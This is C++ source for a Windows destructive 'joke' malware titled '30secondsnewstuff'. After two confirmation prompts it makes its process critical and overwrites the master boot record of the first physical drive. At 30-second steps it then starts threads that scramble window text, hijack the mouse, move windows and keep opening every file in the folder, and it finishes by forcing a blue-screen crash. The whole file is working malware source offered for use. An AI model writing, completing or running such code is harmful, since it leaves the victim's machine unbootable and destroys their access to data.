// 30secondsnewstuff.cpp : Defines the entry point for the console application.
// please use the release x86 configuration

#include <Windows.h>
#include <iostream>
#include <dwmapi.h>
#include <shlwapi.h>
#include "bootrec.h"
#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib,"Dwmapi.lib")
#pragma comment(lib,"Advapi32.lib")
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL, //Open the handle
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0); //Write the numbers of the image to the drive 
	return 1;
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
LPCWSTR generateRandomUnicodeString(int len) {
	wchar_t* ustr = new wchar_t[len + 1];  // +1 for '\0'
	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}
DWORD WINAPI TextProc(LPVOID lpParam) {
	while (true) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)generateRandomUnicodeString(rand() % 2561020 + 2561020), SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}
DWORD WINAPI notaskbar(LPVOID lpvd) {
	static HWND hShellWnd = ::FindWindow(("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
DWORD WINAPI cur(LPVOID lpParam) {
	while (true) {
		INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		int X = rand() % w;
		int Y = rand() % h;
		SetCursorPos(X, Y);
		Sleep(1);
	}
}
DWORD WINAPI Click(LPVOID lpstart) {
	INPUT input;
	input.type = INPUT_MOUSE;

	while (true) {
		input.mi.dwFlags = (rand() % 2) ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTUP;

		SendInput(1, &input, sizeof(INPUT));
		RtlZeroMemory(&input, sizeof(input));

		Sleep(rand() % 70 + 50);
	}
}
DWORD WINAPI WinMove(LPVOID lpstart) { //credits to Maxi2022gt
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (true) {
        HWND wnd = GetForegroundWindow();
        MoveWindow(wnd, rand() % w, rand() % h, rand() % w, rand() % h, false);
        Sleep(rand() % 100);
    }
}
typedef const char *PCCHAR;
typedef const wchar_t *PCWCHAR;

DWORD CALLBACK Spammer(LPVOID lpvd) { //credits to NotCCR, but I made it open every file 
	WIN32_FIND_DATAA wfd;
	PCCHAR dirc = "*.*";
	while (true) {
		HANDLE hFnd = FindFirstFileA(dirc, &wfd);
		ShellExecuteA(NULL, "open", wfd.cFileName, NULL, NULL, SW_SHOWDEFAULT);
		while (FindNextFileA(hFnd, &wfd)) {
			ShellExecuteA(NULL, "open", wfd.cFileName, NULL, NULL, SW_SHOWDEFAULT);
			Sleep(3000);
		}
	}
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
) {
	if (MessageBoxW(NULL, L"Run 30secondsnewstuff?", L"30secondsnewstuff by Venra", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will kill your PC, continue?", L"Last Warning - 30secondsnewstuff", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			Sleep(30000);
			CreateThread(0, 0, TextProc, 0, 0, 0);
			Sleep(30000);
			CreateThread(0, 0, cur, 0, 0, 0);
			Sleep(30000);
			CreateThread(0, 0, Click, 0, 0, 0);
			Sleep(30000);
			CreateThread(0, 0, WinMove, 0, 0, 0);
			Sleep(30000);
			CreateThread(0, 0, Spammer, 0, 0, 0);
			Sleep(30000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC000022C, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
